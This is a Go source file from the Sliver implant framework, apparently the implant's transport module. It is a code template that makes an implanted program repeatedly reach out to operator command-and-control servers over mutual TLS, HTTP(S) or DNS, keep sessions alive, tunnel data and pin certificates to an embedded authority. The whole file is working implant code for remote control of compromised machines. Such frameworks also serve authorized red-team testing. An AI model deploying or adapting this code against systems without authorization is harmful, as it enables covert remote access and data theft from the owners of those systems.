package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"crypto/x509"
	"io"

	// {{if .HTTPc2Enabled}}
	"net"
	// {{end}}
	"net/url"

	// {{if .Debug}}
	"log"
	// {{end}}

	"os"
	"strconv"
	"sync"
	"time"

	pb "github.com/bishopfox/sliver/protobuf/sliver"

	// {{if .HTTPc2Enabled}}
	"github.com/golang/protobuf/proto"
	// {{end}}
)

var (
	keyPEM    = `{{.Key}}`
	certPEM   = `{{.Cert}}`
	caCertPEM = `{{.CACert}}`

	readBufSize       = 16 * 1024 // 16kb
	maxErrors         = getMaxConnectionErrors()
	reconnectInterval = getReconnectInterval()

	ccCounter = new(int)

	activeC2 string
)

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	ctrl    chan bool
	cleanup func()
	once    *sync.Once
	tunnels *map[uint64]*Tunnel
	mutex   *sync.RWMutex
}

// Cleanup - Execute cleanup once
func (c *Connection) Cleanup() {
	c.once.Do(c.cleanup)
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID     uint64
	Reader io.ReadCloser
	Writer io.WriteCloser
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

// StartConnectionLoop - Starts the main connection loop
func StartConnectionLoop() *Connection {

	// {{if .Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	connectionAttempts := 0
	for connectionAttempts < maxErrors {

		var connection *Connection
		var err error

		uri := nextCCServer()
		// {{if .Debug}}
		log.Printf("Next CC = %s", uri.String())
		// {{end}}

		switch uri.Scheme {

		// *** MTLS ***
		// {{if .MTLSc2Enabled}}
		case "mtls":
			connection, err = mtlsConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				return connection
			}
			// {{if .Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}}  - MTLSc2Enabled

		case "https":
			fallthrough
		case "http":
			// *** HTTP ***
			// {{if .HTTPc2Enabled}}
			connection, err = httpConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				return connection
			}
			// {{if .Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} - HTTPc2Enabled

		case "dns":
			// *** DNS ***
			// {{if .DNSc2Enabled}}
			connection, err = dnsConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				return connection
			}
			// {{if .Debug}}
			log.Printf("[dns] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} - DNSc2Enabled

		default:
			// {{if .Debug}}
			log.Printf("Unknown c2 protocol %s", uri.Scheme)
			// {{end}}
		}

		// {{if .Debug}}
		log.Printf("sleep ...")
		// {{end}}
		time.Sleep(reconnectInterval)
	}
	// {{if .Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}

	return nil
}

var ccServers = []string{
	// {{range $index, $value := .C2}}
	"{{$value}}", // {{$index}}
	// {{end}}
}

// GetActiveC2 returns the URL of the C2 in use
func GetActiveC2() string {
	return activeC2
}

func nextCCServer() *url.URL {
	uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
	*ccCounter++
	if err != nil {
		return nextCCServer()
	}
	return uri
}

func getReconnectInterval() time.Duration {
	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
	if err != nil {
		return 30 * time.Second
	}
	return time.Duration(reconnect) * time.Second
}

func getMaxConnectionErrors() int {
	maxConnectionErrors, err := strconv.Atoi(`{{.MaxConnectionErrors}}`)
	if err != nil {
		return 1000
	}
	return maxConnectionErrors
}

// {{if .MTLSc2Enabled}}
func mtlsConnect(uri *url.URL) (*Connection, error) {
	// {{if .Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}
	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
	if err != nil {
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		cleanup: func() {
			// {{if .Debug}}
			log.Printf("[mtls] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := socketReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
			}
		}
	}()

	return connection, nil
}

// {{end}} -MTLSc2Enabled

// {{if .HTTPc2Enabled}}
func httpConnect(uri *url.URL) (*Connection, error) {

	// {{if .Debug}}
	log.Printf("Connecting -> http(s)://%s", uri.Host)
	// {{end}}
	client, err := HTTPStartSession(uri.Host)
	if err != nil {
		// {{if .Debug}}
		log.Printf("http(s) connection error %v", err)
		// {{end}}
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		cleanup: func() {
			// {{if .Debug}}
			log.Printf("[http] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			data, _ := proto.Marshal(envelope)
			// {{if .Debug}}
			log.Printf("[http] send envelope ...")
			// {{end}}
			go client.Send(data)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			select {
			case <-ctrl:
				return
			default:
				resp, err := client.Poll()
				switch err := err.(type) {
				case nil:
					envelope := &pb.Envelope{}
					proto.Unmarshal(resp, envelope)
					if err != nil {
						continue
					}
					recv <- envelope
				case net.Error:
					if err.Timeout() {
						// {{if .Debug}}
						log.Printf("non-fatal error, continue")
						// {{end}}
						continue
					}
					return
				case *url.Error:
					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
						// {{if .Debug}}
						log.Printf("non-fatal error, continue")
						// {{end}}
						continue
					}
					return
				default:
					// {{if .Debug}}
					log.Printf("[http] error: %#v", err)
					// {{end}}
					return
				}
			}
		}
	}()

	return connection, nil
}

// {{end}} -HTTPc2Enabled

// {{if .DNSc2Enabled}}
func dnsConnect(uri *url.URL) (*Connection, error) {
	dnsParent := uri.Hostname()
	// {{if .Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, sessionKey, err := dnsStartSession(dnsParent)
	if err != nil {
		return nil, err
	}
	// {{if .Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		cleanup: func() {
			// {{if .Debug}}
			log.Printf("[dns] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true // Stop polling
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
	}()

	return connection, nil
}

// {{end}} - .DNSc2Enabled

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		// {{if .Debug}}
		log.Printf("Failed to parse root certificate")
		// {{end}}
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to parse certificate: " + err.Error())
		// {{end}}
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		// {{if .Debug}}
		log.Printf("Failed to verify certificate: " + err.Error())
		// {{end}}
		return err
	}

	return nil
}
